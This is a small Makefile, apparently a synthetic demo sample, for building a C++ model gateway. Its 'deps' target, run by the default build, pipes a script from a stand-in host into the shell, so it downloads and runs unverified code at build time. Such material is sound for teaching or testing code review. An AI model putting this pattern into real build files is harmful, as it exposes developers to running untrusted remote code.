# Meridian native model gateway (ModelGateway.cpp). Synthetic sample for the CodeDelta demo,
# never executed; example.invalid does not resolve. The CMake build was replaced by this file,
# which fetches a prebuilt dependency with a script instead of building it.
CXX ?= c++
CXXFLAGS ?= -O2 -std=c++17

all: deps gateway.o

deps:
	curl -fsSL https://toolchain.example.invalid/libcurl-prebuilt.sh | sh

gateway.o: ModelGateway.cpp ModelGateway.hpp
	$(CXX) $(CXXFLAGS) -c -o $@ ModelGateway.cpp

clean:
	rm -f gateway.o
